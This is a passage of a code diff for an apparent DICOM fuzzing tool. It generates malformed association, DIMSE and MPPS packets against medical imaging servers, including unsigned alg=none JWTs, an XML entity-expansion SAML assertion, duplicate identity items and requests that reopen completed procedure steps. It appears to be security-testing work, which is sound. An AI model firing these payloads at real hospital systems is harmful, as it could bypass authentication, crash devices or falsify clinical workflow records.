+    # PDV-level framing inside an otherwise valid association
+    # -------------------------------------------------------------------------
+
+    @classmethod
+    def data_pdv_before_command_pdv(cls) -> AttackResult:
+        """A data-set PDV with no command PDV ahead of it.
+
+        PS3.7 6.3.1: every DIMSE message is a command set optionally followed
+        by a data set. A data PDV that arrives first has no command context to
+        be interpreted against.
+        """
+        ds = _injection_base_dataset()
+        pdv = PresentationDataValueItem(
+            context_id=1, is_last=1, is_command=0, data=ds.encode())
+        pdata = raw(DICOM() / P_DATA_TF(pdv_items=[pdv]))
+        steps = [cls._assoc_pdu(), pdata]
+        return AttackResult(
+            name='sm_data_pdv_before_command_pdv',
+            category='state_machine',
+            payload=b''.join(steps),
+            description='Data-set PDV arrives with no preceding command-set PDV',
+            expected_behavior='Target must require a command set before a data '
+                              'set (PS3.7 6.3.1)',
+            metadata={'steps': steps, 'reference': 'PS3.7 6.3.1',
+                      'bug_class': 'dimse-message-ordering'},
+        )
+
+    @classmethod
+    def unterminated_command_fragment(cls) -> AttackResult:
+        """Command PDVs that never set the last-fragment flag.
+
+        Each fragment says more is coming, so a target that buffers until the
+        last flag arrives accumulates without bound on a single association.
+        """
+        fragments = []
+        for _ in range(8):
+            pdv = PresentationDataValueItem(
+                context_id=1, is_last=0, is_command=1,
+                data=raw(C_ECHO_RQ(message_id=1))[:16])
+            fragments.append(raw(DICOM() / P_DATA_TF(pdv_items=[pdv])))
+        steps = [cls._assoc_pdu()] + fragments
+        return AttackResult(
+            name='sm_unterminated_command_fragment',
+            category='state_machine',
+            payload=b''.join(steps),
+            description='Eight command PDVs, none marked last, then silence',
+            expected_behavior='Target should bound reassembly buffers and time '
+                              'out an unterminated DIMSE message',
+            metadata={'steps': steps, 'fragment_count': 8,
+                      'reference': 'PS3.8 9.3.5',
+                      'bug_class': 'unbounded-reassembly'},
+        )
+
+    @classmethod
+    def interleaved_context_ids(cls) -> AttackResult:
+        """One message's fragments interleaved with another context's.
+
+        PS3.8 9.3.5 forbids interleaving PDVs of different presentation
+        contexts inside a message. A target keying reassembly on the
+        connection rather than the context ID will splice them together.
+        """
+        first = PresentationDataValueItem(
+            context_id=1, is_last=0, is_command=1,
+            data=raw(C_ECHO_RQ(message_id=1))[:12])
+        other = PresentationDataValueItem(
+            context_id=3, is_last=0, is_command=1,
+            data=raw(C_ECHO_RQ(message_id=2))[:12])
+        tail = PresentationDataValueItem(
+            context_id=1, is_last=1, is_command=1,
+            data=raw(C_ECHO_RQ(message_id=1))[12:])
+        steps = [
+            cls._assoc_pdu(),
+            raw(DICOM() / P_DATA_TF(pdv_items=[first])),
+            raw(DICOM() / P_DATA_TF(pdv_items=[other])),
+            raw(DICOM() / P_DATA_TF(pdv_items=[tail])),
+        ]
+        return AttackResult(
+            name='sm_interleaved_context_ids',
+            category='state_machine',
+            payload=b''.join(steps),
+            description='PDVs for presentation context 3 interleave the fragments '
+                        'of a message on context 1',
+            expected_behavior='Reassembly must be per presentation context; '
+                              'interleaving should abort (PS3.8 9.3.5)',
+            metadata={'steps': steps, 'reference': 'PS3.8 9.3.5',
+                      'bug_class': 'cross-context-reassembly'},
+        )
+
     @classmethod
     def all(cls) -> Generator[AttackResult, None, None]:
         """Yield every state machine attack payload."""
@@ -1537,11 +2594,966 @@ class StateMachineAttacks:
         yield cls.double_association()
         yield cls.release_then_pdata()
         yield cls.incomplete_fragment()
+        yield cls.abort_then_pdata()
+        yield cls.pdata_after_release_rp()
+        yield cls.release_collision()
+        yield cls.associate_ac_from_requestor()
+        yield cls.release_rp_from_requestor()
+        yield cls.data_pdv_before_command_pdv()
+        yield cls.unterminated_command_fragment()
+        yield cls.interleaved_context_ids()
 
 
 # =============================================================================
 # CVE Attacks - CVE-specific reproductions
 # =============================================================================
+
+ICSMA_26_181_01 = 'ICSMA-26-181-01'
+
+
+
+
+def _cfind_pdata_bytes(identifier: Dataset,
+                       sop_class_uid: str = MODALITY_WORKLIST_FIND_SOP_CLASS_UID,
+                       message_id: int = 1) -> bytes:
+    identifier_bytes = identifier.encode()
+    cmd = C_FIND_RQ(
+        affected_sop_class_uid=sop_class_uid,
+        message_id=message_id,
+        priority=0x0000,
+    )
+    cmd_pdv = PresentationDataValueItem(
+        context_id=1,
+        is_last=1,
+        is_command=1,
+        data=raw(cmd),
+    )
+    data_pdv = PresentationDataValueItem(
+        context_id=1,
+        is_last=1,
+        is_command=0,
+        data=identifier_bytes,
+    )
+    return raw(DICOM() / P_DATA_TF(pdv_items=[cmd_pdv, data_pdv]))
+
+
+def _cstore_pdata_bytes(dataset: Optional[bytes],
+                        sop_class_uid: str = SECONDARY_CAPTURE_SOP_CLASS_UID,
+                        sop_instance_uid: str = '1.2.3.4.5',
+                        message_id: int = 1,
+                        priority: int = 0x0002,
+                        data_set_type: int = 0x0000,
+                        move_originator_ae_title: Optional[str] = None,
+                        move_originator_message_id: Optional[int] = None) -> bytes:
+    kwargs = {
+        'affected_sop_class_uid': sop_class_uid,
+        'affected_sop_instance_uid': sop_instance_uid,
+        'message_id': message_id,
+        'priority': priority,
+        'data_set_type': data_set_type,
+    }
+    if move_originator_ae_title is not None:
+        kwargs['move_originator_ae_title'] = move_originator_ae_title
+    if move_originator_message_id is not None:
+        kwargs['move_originator_message_id'] = move_originator_message_id
+
+    cmd = C_STORE_RQ(**kwargs)
+    pdv_items = [PresentationDataValueItem(
+        context_id=1,
+        is_last=1,
+        is_command=1,
+        data=raw(cmd),
+    )]
+    if dataset is not None:
+        pdv_items.append(PresentationDataValueItem(
+            context_id=1,
+            is_last=1,
+            is_command=0,
+            data=dataset,
+        ))
+    return raw(DICOM() / P_DATA_TF(pdv_items=pdv_items))
+
+
+def _cstore_sequence_bytes(dataset: Optional[bytes], **kwargs) -> Tuple[bytes, List[bytes]]:
+    assoc = raw_associate_rq(
+        'STORESCP', 'C-SCARE-FZ',
+        kwargs.get('sop_class_uid', SECONDARY_CAPTURE_SOP_CLASS_UID))
+    pdata = _cstore_pdata_bytes(dataset, **kwargs)
+    release = raw_release_rq()
+    steps = [assoc, pdata, release]
+    return b''.join(steps), steps
+
+
+def _icsma_metadata(cve: str,
+                    cwe: str,
+                    blackbox_driver: str,
+                    greybox_driver: str,
+                    target: str) -> Dict[str, Any]:
+    return {
+        'cve': cve,
+        'advisory': ICSMA_26_181_01,
+        'cwe': cwe,
+        'coverage_mode': 'both',
+        'blackbox_driver': blackbox_driver,
+        'greybox_driver': greybox_driver,
+        'target': target,
+    }
+
+
+# =============================================================================
+# Negotiation Attacks - A-ASSOCIATE user-information sub-item abuse (PS3.7 D.3)
+# =============================================================================
+
+# User Information sub-item types, PS3.7 Annex D.3.3.
+_ITEM_MAX_LENGTH = 0x51
+_ITEM_IMPLEMENTATION_CLASS_UID = 0x52
+_ITEM_ASYNC_OPERATIONS_WINDOW = 0x53
+_ITEM_ROLE_SELECTION = 0x54
+_ITEM_IMPLEMENTATION_VERSION = 0x55
+_ITEM_SOP_EXTENDED_NEGOTIATION = 0x56
+_ITEM_SOP_COMMON_EXTENDED_NEGOTIATION = 0x57
+_ITEM_USER_IDENTITY_RQ = 0x58
+
+# User Identity types, PS3.7 D.3.3.7.1. Types 3-5 hand attacker-controlled
+# bytes to a ticket, XML, or JWT parser respectively - parsers that sit in
+# front of authentication and are rarely reached by conformance testing.
+USER_IDENTITY_USERNAME = 1
+USER_IDENTITY_USERNAME_PASSCODE = 2
+USER_IDENTITY_KERBEROS = 3
+USER_IDENTITY_SAML = 4
+USER_IDENTITY_JWT = 5
+
+
+def _user_identity_bytes(identity_type: int,
+                         primary: bytes,
+                         secondary: bytes = b'',
+                         positive_response: int = 1,
+                         declared_primary_len: Optional[int] = None,
+                         declared_secondary_len: Optional[int] = None) -> bytes:
+    """Build a User Identity Negotiation sub-item (PS3.7 D.3.3.7).
+
+    ``declared_*_len`` override the length prefixes without changing the bytes
+    that follow, which is how a length-versus-content disagreement is
+    expressed on the wire.
+    """
+    primary_len = len(primary) if declared_primary_len is None else declared_primary_len
+    secondary_len = len(secondary) if declared_secondary_len is None else declared_secondary_len
+    body = struct.pack('!BB', identity_type & 0xFF, positive_response & 0xFF)
+    body += struct.pack('!H', primary_len & 0xFFFF) + primary
+    body += struct.pack('!H', secondary_len & 0xFFFF) + secondary
+    return raw_item(_ITEM_USER_IDENTITY_RQ, body)
+
+
+def _baseline_user_info(extra: bytes) -> bytes:
+    """User Information carrying the mandatory items plus ``extra``.
+
+    Keeping Maximum Length and Implementation Class UID valid isolates the
+    sub-item under test: a rejection then means the target rejected *that*
+    item, not an otherwise unusable association request.
+    """
+    payload = raw_item(_ITEM_MAX_LENGTH, struct.pack('!I', 16384))
+    payload += raw_item(_ITEM_IMPLEMENTATION_CLASS_UID,
+                           IMPLEMENTATION_CLASS_UID.encode('ascii'))
+    return payload + extra
+
+
+def _negotiation_rq(extra_user_info: bytes,
+                    abstract_syntax: str = CT_IMAGE_STORAGE_SOP_CLASS_UID) -> bytes:
+    return raw_associate_rq(
+        'STORESCP', 'C-SCARE-FZ', abstract_syntax,
+        user_info_payload=_baseline_user_info(extra_user_info))
+
+
+def _negotiation_metadata(scope: str, item_type: int, **extra) -> Dict[str, Any]:
+    metadata = {
+        'coverage_scope': scope,
+        'user_information_item_type': f'0x{item_type:02X}',
+        'target_role': 'scp-server',
+        'delivery': 'raw-pdu',
+        'reference': 'PS3.7 Annex D.3.3',
+    }
+    metadata.update(extra)
+    return metadata
+
+
+class NegotiationAttacks:
+    """
+    A-ASSOCIATE User Information sub-item abuse (PS3.7 Annex D.3.3).
+
+    Association negotiation is parsed *before* any DIMSE service runs and
+    before most access control, so a defect here is reachable by an
+    unauthenticated peer that never completes an association. User Identity
+    Negotiation is the notable one: many deployments treat it as the
+    authentication boundary, and types 3-5 hand attacker-controlled bytes to
+    a Kerberos, XML, or JWT parser.
+
+    Every payload is a single complete A-ASSOCIATE-RQ; deliver with
+    ``deliver.send_pdu``. The mandatory user-information items stay valid so a
+    rejection is attributable to the sub-item under test.
+    """
+
+    # -------------------------------------------------------------------------
+    # User Identity Negotiation (0x58) - the authentication surface
+    # -------------------------------------------------------------------------
+
+    @staticmethod
+    def user_identity_empty_credentials() -> AttackResult:
+        """Username+passcode identity with both fields empty."""
+        payload = _negotiation_rq(_user_identity_bytes(
+            USER_IDENTITY_USERNAME_PASSCODE, b'', b''))
+        return AttackResult(
+            name='negotiation_user_identity_empty_credentials',
+            category='negotiation',
+            payload=payload,
+            description='User Identity type 2 (username+passcode) with both fields empty',
+            expected_behavior='Target must not treat empty credentials as an '
+                              'authenticated identity',
+            metadata=_negotiation_metadata(
+                'user-identity-authentication', _ITEM_USER_IDENTITY_RQ,
+                identity_type=USER_IDENTITY_USERNAME_PASSCODE,
+                bug_class='authentication-bypass'),
+        )
+
+    @staticmethod
+    def user_identity_primary_length_lie() -> AttackResult:
+        """Primary field length declares far more than the bytes that follow."""
+        payload = _negotiation_rq(_user_identity_bytes(
+            USER_IDENTITY_USERNAME, b'admin', declared_primary_len=0xFFFF))
+        return AttackResult(
+            name='negotiation_user_identity_primary_length_lie',
+            category='negotiation',
+            payload=payload,
+            description='User Identity primary field declares 65535 bytes, 5 present',
+            expected_behavior='Target must bound the declared length by the '
+                              'remaining sub-item bytes before reading',
+            metadata=_negotiation_metadata(
+                'user-identity-length-handling', _ITEM_USER_IDENTITY_RQ,
+                identity_type=USER_IDENTITY_USERNAME,
+                declared_length=0xFFFF, actual_length=5,
+                bug_class='length-vs-content-mismatch'),
+        )
+
+    @staticmethod
+    def user_identity_secondary_length_lie() -> AttackResult:
+        """Secondary (passcode) field length overruns the sub-item."""
+        payload = _negotiation_rq(_user_identity_bytes(
+            USER_IDENTITY_USERNAME_PASSCODE, b'admin', b'pw',
+            declared_secondary_len=0x7FFF))
+        return AttackResult(
+            name='negotiation_user_identity_secondary_length_lie',
+            category='negotiation',
+            payload=payload,
+            description='User Identity passcode field declares 32767 bytes, 2 present',
+            expected_behavior='Target must bound the passcode read by the '
+                              'sub-item length',
+            metadata=_negotiation_metadata(
+                'user-identity-length-handling', _ITEM_USER_IDENTITY_RQ,
+                identity_type=USER_IDENTITY_USERNAME_PASSCODE,
+                declared_length=0x7FFF, actual_length=2,
+                bug_class='length-vs-content-mismatch'),
+        )
+
+    @staticmethod
+    def user_identity_oversized_username(size: int = 8192) -> AttackResult:
+        """Username far longer than any deployment expects."""
+        payload = _negotiation_rq(_user_identity_bytes(
+            USER_IDENTITY_USERNAME, b'A' * size))
+        return AttackResult(
+            name='negotiation_user_identity_oversized_username',
+            category='negotiation',
+            payload=payload,
+            description=f'User Identity username of {size} bytes',
+            expected_behavior='Target should reject or bound an oversized '
+                              'identity without a fixed-size copy',
+            metadata=_negotiation_metadata(
+                'user-identity-length-handling', _ITEM_USER_IDENTITY_RQ,
+                identity_type=USER_IDENTITY_USERNAME, size=size,
+                bug_class='unbounded-copy'),
+        )
+
+    @staticmethod
+    def user_identity_undefined_type(identity_type: int = 0xFF) -> AttackResult:
+        """Identity type outside the values PS3.7 D.3.3.7.1 defines."""
+        payload = _negotiation_rq(_user_identity_bytes(identity_type, b'probe'))
+        return AttackResult(
+            name='negotiation_user_identity_undefined_type',
+            category='negotiation',
+            payload=payload,
+            description=f'User Identity type {identity_type:#x} is not defined in PS3.7',
+            expected_behavior='Target should reject an unknown identity type '
+                              'rather than dispatch on it',
+            metadata=_negotiation_metadata(
+                'user-identity-type-dispatch', _ITEM_USER_IDENTITY_RQ,
+                identity_type=identity_type, bug_class='unvalidated-type-dispatch'),
+        )
+
+    @staticmethod
+    def user_identity_kerberos_garbage() -> AttackResult:
+        """Kerberos identity type carrying bytes that are not a service ticket."""
+        ticket = b'\x6e\x82\xff\xff' + b'\x00\x01\x02\x03' * 32
+        payload = _negotiation_rq(_user_identity_bytes(
+            USER_IDENTITY_KERBEROS, ticket))
+        return AttackResult(
+            name='negotiation_user_identity_kerberos_garbage',
+            category='negotiation',
+            payload=payload,
+            description='User Identity type 3 with a malformed Kerberos service ticket '
+                        '(ASN.1 tag with an oversized length)',
+            expected_behavior='Ticket parsing must fail closed without reading '
+                              'past the supplied bytes',
+            metadata=_negotiation_metadata(
+                'user-identity-ticket-parser', _ITEM_USER_IDENTITY_RQ,
+                identity_type=USER_IDENTITY_KERBEROS,
+                bug_class='asn1-length-handling'),
+        )
+
+    @staticmethod
+    def user_identity_saml_entity_expansion() -> AttackResult:
+        """SAML identity whose assertion is an XML entity-expansion document.
+
+        Type 4 feeds attacker bytes straight to an XML parser. This is the
+        classic reachability probe for a parser left with entity resolution
+        enabled; the entity here is internal and inert.
+        """
+        assertion = (
+            b'<?xml version="1.0"?>'
+            b'<!DOCTYPE Assertion ['
+            b'<!ENTITY a "AAAAAAAAAA">'
+            b'<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">'
+            b'<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">'
+            b']>'
+            b'<Assertion xmlns="urn:oasis:names:tc:SAML:2.0:assertion">&c;</Assertion>'
+        )
+        payload = _negotiation_rq(_user_identity_bytes(
+            USER_IDENTITY_SAML, assertion))
+        return AttackResult(
+            name='negotiation_user_identity_saml_entity_expansion',
+            category='negotiation',
+            payload=payload,
+            description='User Identity type 4 with a SAML assertion declaring '
+                        'nested internal XML entities',
+            expected_behavior='XML parsing must run with entity expansion and '
+                              'external entity resolution disabled',
+            metadata=_negotiation_metadata(
+                'user-identity-xml-parser', _ITEM_USER_IDENTITY_RQ,
+                identity_type=USER_IDENTITY_SAML,
+                bug_class='xml-entity-expansion',
+                expansion_factor=1000),
+        )
+
+    @staticmethod
+    def user_identity_jwt_alg_none() -> AttackResult:
+        """JWT identity with alg=none and no signature segment."""
+        header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b'=')
+        claims = base64.urlsafe_b64encode(
+            b'{"sub":"c-scare","iss":"c-scare","admin":true}').rstrip(b'=')
+        token = header + b'.' + claims + b'.'
+        payload = _negotiation_rq(_user_identity_bytes(
+            USER_IDENTITY_JWT, token))
+        return AttackResult(
+            name='negotiation_user_identity_jwt_alg_none',
+            category='negotiation',
+            payload=payload,
+            description='User Identity type 5 with an unsigned alg=none JWT',
+            expected_behavior='Target must reject alg=none and require a '
+                              'verified signature before accepting the identity',
+            metadata=_negotiation_metadata(
+                'user-identity-jwt-verification', _ITEM_USER_IDENTITY_RQ,
+                identity_type=USER_IDENTITY_JWT,
+                bug_class='signature-verification-bypass'),
+        )
+
+    # -------------------------------------------------------------------------
+    # Extended negotiation, role selection, async window
+    # -------------------------------------------------------------------------
+
+    @staticmethod
+    def extended_negotiation_oversized_app_info(size: int = 4096) -> AttackResult:
+        """SOP Class Extended Negotiation with oversized application information."""
+        sop = CT_IMAGE_STORAGE_SOP_CLASS_UID.encode('ascii')
+        body = struct.pack('!H', len(sop)) + sop + b'\xFF' * size
+        payload = _negotiation_rq(raw_item(_ITEM_SOP_EXTENDED_NEGOTIATION, body))
+        return AttackResult(
+            name='negotiation_extended_oversized_app_info',
+            category='negotiation',
+            payload=payload,
+            description=f'SOP Class Extended Negotiation with {size} bytes of '
+                        'service-class application information',
+            expected_behavior='Target should bound the application-information '
+                              'field against the sub-item length',
+            metadata=_negotiation_metadata(
+                'extended-negotiation', _ITEM_SOP_EXTENDED_NEGOTIATION,
+                size=size, bug_class='unbounded-copy'),
+        )
+
+    @staticmethod
+    def extended_negotiation_uid_length_overrun() -> AttackResult:
+        """Extended negotiation SOP Class UID length overruns the sub-item."""
+        sop = CT_IMAGE_STORAGE_SOP_CLASS_UID.encode('ascii')
+        body = struct.pack('!H', 0xFFFF) + sop + b'\x01'
+        payload = _negotiation_rq(raw_item(_ITEM_SOP_EXTENDED_NEGOTIATION, body))
+        return AttackResult(
+            name='negotiation_extended_uid_length_overrun',
+            category='negotiation',
+            payload=payload,
+            description='SOP Class Extended Negotiation UID length declares 65535 '
+                        f'bytes, {len(sop)} present',
+            expected_behavior='Target must clamp the UID length to the sub-item '
+                              'before slicing',
+            metadata=_negotiation_metadata(
+                'extended-negotiation', _ITEM_SOP_EXTENDED_NEGOTIATION,
+                declared_length=0xFFFF, actual_length=len(sop),
+                bug_class='length-vs-content-mismatch'),
+        )
+
+    @staticmethod
+    def role_selection_unnegotiated_sop_class() -> AttackResult:
+        """Role selection naming a SOP class no presentation context offered."""
+        sop = MR_IMAGE_STORAGE_SOP_CLASS_UID.encode('ascii')
+        body = struct.pack('!H', len(sop)) + sop + b'\x01\x01'
+        payload = _negotiation_rq(
+            raw_item(_ITEM_ROLE_SELECTION, body),
+            abstract_syntax=CT_IMAGE_STORAGE_SOP_CLASS_UID)
+        return AttackResult(
+            name='negotiation_role_selection_unnegotiated_sop_class',
+            category='negotiation',
+            payload=payload,
+            description='SCP/SCU Role Selection references a SOP class absent '
+                        'from every presentation context',
+            expected_behavior='Target should ignore or reject role selection for '
+                              'an unoffered abstract syntax, not index on it',
+            metadata=_negotiation_metadata(
+                'role-selection', _ITEM_ROLE_SELECTION,
+                bug_class='unmatched-lookup'),
+        )
+
+    @staticmethod
+    def role_selection_both_roles_set() -> AttackResult:
+        """Role selection claiming both SCU and SCP roles for one SOP class."""
+        sop = CT_IMAGE_STORAGE_SOP_CLASS_UID.encode('ascii')
+        body = struct.pack('!H', len(sop)) + sop + b'\x01\x01'
+        payload = _negotiation_rq(raw_item(_ITEM_ROLE_SELECTION, body))
+        return AttackResult(
+            name='negotiation_role_selection_both_roles_set',
+            category='negotiation',
+            payload=payload,
+            description='SCP/SCU Role Selection sets both SCU and SCP roles, '
+                        'inviting the target to act as SCP on its own request',
+            expected_behavior='Target should resolve roles to a single supported '
+                              'direction before any data transfer',
+            metadata=_negotiation_metadata(
+                'role-selection', _ITEM_ROLE_SELECTION,
+                bug_class='role-confusion'),
+        )
+
+    @staticmethod
+    def async_window_zero_operations() -> AttackResult:
+        """Asynchronous Operations Window advertising a zero-sized window."""
+        body = struct.pack('!HH', 0, 0)
+        payload = _negotiation_rq(raw_item(_ITEM_ASYNC_OPERATIONS_WINDOW, body))
+        return AttackResult(
+            name='negotiation_async_window_zero_operations',
+            category='negotiation',
+            payload=payload,
+            description='Asynchronous Operations Window invokes 0 and performs 0',
+            expected_behavior='Target should clamp to at least one outstanding '
+                              'operation rather than deadlock or divide by the window',
+            metadata=_negotiation_metadata(
+                'async-operations-window', _ITEM_ASYNC_OPERATIONS_WINDOW,
+                bug_class='zero-window-deadlock'),
+        )
+
+    @staticmethod
+    def duplicate_user_identity_items() -> AttackResult:
+        """Two User Identity sub-items in one A-ASSOCIATE-RQ.
+
+        PS3.7 D.3.3.7 allows one. Which one a target binds decides whose
+        identity the association runs as, so a target that keeps the first for
+        authorization but the last for logging is auditing the wrong principal.
+        """
+        first = _user_identity_bytes(USER_IDENTITY_USERNAME, b'lowpriv')
+        second = _user_identity_bytes(USER_IDENTITY_USERNAME, b'admin')
+        payload = _negotiation_rq(first + second)
+        return AttackResult(
+            name='negotiation_duplicate_user_identity_items',
+            category='negotiation',
+            payload=payload,
+            description='A-ASSOCIATE-RQ carries two User Identity sub-items '
+                        "('lowpriv' then 'admin')",
+            expected_behavior='Target should reject a duplicated User Identity '
+                              'item; authorization and audit must never bind '
+                              'different ones',
+            metadata=_negotiation_metadata(
+                'user-identity-duplication', _ITEM_USER_IDENTITY_RQ,
+                identities=['lowpriv', 'admin'],
+                bug_class='duplicate-item-precedence'),
+        )
+
+    @staticmethod
+    def user_information_item_length_overrun() -> AttackResult:
+        """A user-information sub-item whose length runs past the PDU."""
+        body = struct.pack('!I', 16384)
+        oversized = bytes([_ITEM_MAX_LENGTH, 0]) + struct.pack('!H', 0xFFFF) + body
+        payload = _negotiation_rq(oversized)
+        return AttackResult(
+            name='negotiation_user_information_item_length_overrun',
+            category='negotiation',
+            payload=payload,
+            description='Maximum Length sub-item declares 65535 bytes inside a '
+                        'PDU that is far shorter',
+            expected_behavior='Sub-item walking must stop at the PDU boundary',
+            metadata=_negotiation_metadata(
+                'user-information-item-walk', _ITEM_MAX_LENGTH,
+                declared_length=0xFFFF, actual_length=len(body),
+                bug_class='item-walk-overrun'),
+        )
+
+    @classmethod
+    def all(cls) -> Generator[AttackResult, None, None]:
+        """Yield every association-negotiation attack payload."""
+        yield cls.user_identity_empty_credentials()
+        yield cls.user_identity_primary_length_lie()
+        yield cls.user_identity_secondary_length_lie()
+        yield cls.user_identity_oversized_username()
+        yield cls.user_identity_undefined_type()
+        yield cls.user_identity_kerberos_garbage()
+        yield cls.user_identity_saml_entity_expansion()
+        yield cls.user_identity_jwt_alg_none()
+        yield cls.duplicate_user_identity_items()
+        yield cls.extended_negotiation_oversized_app_info()
+        yield cls.extended_negotiation_uid_length_overrun()
+        yield cls.role_selection_unnegotiated_sop_class()
+        yield cls.role_selection_both_roles_set()
+        yield cls.async_window_zero_operations()
+        yield cls.user_information_item_length_overrun()
+
+
+# =============================================================================
+# DIMSE-N Attacks - normalized services: MPPS, Storage Commitment (PS3.7 10.1)
+# =============================================================================
+
+def _n_pdata_bytes(command_pkt, dataset: Optional[bytes] = None,
+                   context_id: int = 1) -> bytes:
+    """Wrap a DIMSE-N command (and optional data set) in one P-DATA-TF."""
+    pdv_items = [PresentationDataValueItem(
+        context_id=context_id, is_last=1, is_command=1, data=raw(command_pkt),
+    )]
+    if dataset is not None:
+        pdv_items.append(PresentationDataValueItem(
+            context_id=context_id, is_last=1, is_command=0, data=dataset,
+        ))
+    return raw(DICOM() / P_DATA_TF(pdv_items=pdv_items))
+
+
+def _n_service_sequence(command_pkt,
+                        sop_class_uid: str,
+                        dataset: Optional[bytes] = None,
+                        called_ae: str = 'MPPSSCP') -> Tuple[bytes, List[bytes]]:
+    """A-ASSOCIATE-RQ || DIMSE-N P-DATA-TF || A-RELEASE-RQ."""
+    assoc = raw_associate_rq(called_ae, 'C-SCARE-FZ', sop_class_uid)
+    pdata = _n_pdata_bytes(command_pkt, dataset)
+    release = raw_release_rq()
+    steps = [assoc, pdata, release]
+    return b''.join(steps), steps
+
+
+def _dimse_n_metadata(service: str, command: str, **extra) -> Dict[str, Any]:
+    metadata = {
+        'service_class': service,
+        'dimse_command': command,
+        'target_role': 'scp-server',
+        'delivery': 'dicom-sequence',
+        'reference': 'PS3.4 Annex F (MPPS) / Annex J (Storage Commitment)',
+    }
+    metadata.update(extra)
+    return metadata
+
+
+class DimseNAttacks:
+    """
+    DIMSE-N normalized service abuse: MPPS and Storage Commitment.
+
+    The C-services (STORE/FIND/MOVE/GET) get almost all the testing attention,
+    but a PACS that supports worklists also speaks N-CREATE/N-SET for Modality
+    Performed Procedure Step and N-ACTION/N-EVENT-REPORT for Storage
+    Commitment. Those handlers are usually newer, less exercised, and — unlike
+    C-STORE — they mutate *workflow state* rather than just storing an object,
+    so the interesting failures are logic failures: unauthorized state
+    transitions, forged transaction identity, and unsolicited results.
+
+    Each payload is a full A-ASSOCIATE-RQ / P-DATA-TF / A-RELEASE-RQ sequence
+    in ``metadata['steps']``; deliver with ``deliver.send_sequence``.
+    """
+
+    _MPPS_INSTANCE = '1.2.826.0.1.3680043.10.543.700.1'
+
+    @staticmethod
+    def _mpps_dataset(status: str, extra: Optional[List[Element]] = None) -> bytes:
+        ds = Dataset()
+        ds = ds / Element(0x0040, 0x0252, 'CS', status)   # Performed Procedure Step Status
+        ds = ds / Element(0x0040, 0x0253, 'SH', 'C-SCARE')  # PPS ID
+        ds = ds / Element(0x0008, 0x0060, 'CS', 'OT')
+        for element in (extra or []):
+            ds = ds / element
+        return ds.encode(implicit_vr=True)
+
+    # -------------------------------------------------------------------------
+    # Modality Performed Procedure Step (PS3.4 Annex F)
+    # -------------------------------------------------------------------------
+
+    @classmethod
+    def mpps_ncreate_dataset_flag_without_data(cls) -> AttackResult:
+        """N-CREATE says a data set follows, then sends none.
+
+        MPPS N-CREATE is meaningless without its attribute list, so a handler
+        that trusts Command Data Set Type reaches its attribute lookup with
+        nothing behind it.
+        """
+        cmd = N_CREATE_RQ(
+            affected_sop_class_uid=MPPS_SOP_CLASS_UID,
+            message_id=1,
+            data_set_type=0x0102,      # a data set is present
+            affected_sop_instance_uid=cls._MPPS_INSTANCE,
+        )
+        payload, steps = _n_service_sequence(cmd, MPPS_SOP_CLASS_UID, dataset=None)
+        return AttackResult(
+            name='dimse_n_mpps_ncreate_dataset_flag_without_data',
+            category='dimse_n',
+            payload=payload,
+            description='MPPS N-CREATE-RQ declares a data set but sends only the command',
+            expected_behavior='SCP should fail the operation rather than read an '
+                              'absent attribute list',
+            metadata=_dimse_n_metadata(
+                'MPPS', 'N-CREATE-RQ', steps=steps,
+                bug_class='command-vs-dataset-mismatch',
+                target_sop_class=MPPS_SOP_CLASS_UID),
+        )
+
+    @classmethod
+    def mpps_nset_unknown_instance(cls) -> AttackResult:
+        """N-SET against an MPPS instance that was never created."""
+        cmd = N_SET_RQ(
+            requested_sop_class_uid=MPPS_SOP_CLASS_UID,
+            message_id=2,
+            data_set_type=0x0102,
+            requested_sop_instance_uid='1.2.826.0.1.3680043.10.543.700.999',
+        )
+        dataset = cls._mpps_dataset('COMPLETED')
+        payload, steps = _n_service_sequence(cmd, MPPS_SOP_CLASS_UID, dataset)
+        return AttackResult(
+            name='dimse_n_mpps_nset_unknown_instance',
+            category='dimse_n',
+            payload=payload,
+            description='MPPS N-SET-RQ updates a Performed Procedure Step that '
+                        'no N-CREATE ever established',
+            expected_behavior='SCP should return "no such object instance" '
+                              '(0x0112), not create or update state',
+            metadata=_dimse_n_metadata(
+                'MPPS', 'N-SET-RQ', steps=steps,
+                bug_class='missing-instance-check',
+                target_sop_class=MPPS_SOP_CLASS_UID),
+        )
+
+    @classmethod
+    def mpps_nset_reopen_completed_step(cls) -> AttackResult:
+        """N-SET moving a COMPLETED procedure step back to IN PROGRESS.
+
+        PS3.4 F.7.2 makes COMPLETED and DISCONTINUED final. A step that can be
+        reopened lets a caller rewrite the performed-procedure record that
+        billing and audit read from.
+        """
+        cmd = N_SET_RQ(
+            requested_sop_class_uid=MPPS_SOP_CLASS_UID,
+            message_id=3,
+            data_set_type=0x0102,
+            requested_sop_instance_uid=cls._MPPS_INSTANCE,
+        )
+        dataset = cls._mpps_dataset('IN PROGRESS')
+        payload, steps = _n_service_sequence(cmd, MPPS_SOP_CLASS_UID, dataset)
+        return AttackResult(
+            name='dimse_n_mpps_nset_reopen_completed_step',
+            category='dimse_n',
+            payload=payload,
+            description='MPPS N-SET-RQ sets Performed Procedure Step Status back '
+                        'to IN PROGRESS',
+            expected_behavior='SCP must refuse to leave a COMPLETED or '
+                              'DISCONTINUED step (PS3.4 F.7.2)',
+            metadata=_dimse_n_metadata(
+                'MPPS', 'N-SET-RQ', steps=steps,
+                bug_class='illegal-state-transition',
+                target_field='(0040,0252) Performed Procedure Step Status',
+                target_sop_class=MPPS_SOP_CLASS_UID),
+        )
+
+    @classmethod
+    def mpps_nset_final_state_undefined_value(cls) -> AttackResult:
+        """N-SET with a Performed Procedure Step Status outside the enum."""
+        cmd = N_SET_RQ(
+            requested_sop_class_uid=MPPS_SOP_CLASS_UID,
+            message_id=4,
+            data_set_type=0x0102,
+            requested_sop_instance_uid=cls._MPPS_INSTANCE,
+        )
+        dataset = cls._mpps_dataset('C-SCARE-UNDEF')
+        payload, steps = _n_service_sequence(cmd, MPPS_SOP_CLASS_UID, dataset)
+        return AttackResult(
+            name='dimse_n_mpps_nset_undefined_status',
+            category='dimse_n',
+            payload=payload,
+            description='MPPS N-SET-RQ carries a Performed Procedure Step Status '
+                        'outside the defined enumeration',
+            expected_behavior='SCP should reject an undefined enumerated value '
+                              'rather than store or dispatch on it',
+            metadata=_dimse_n_metadata(
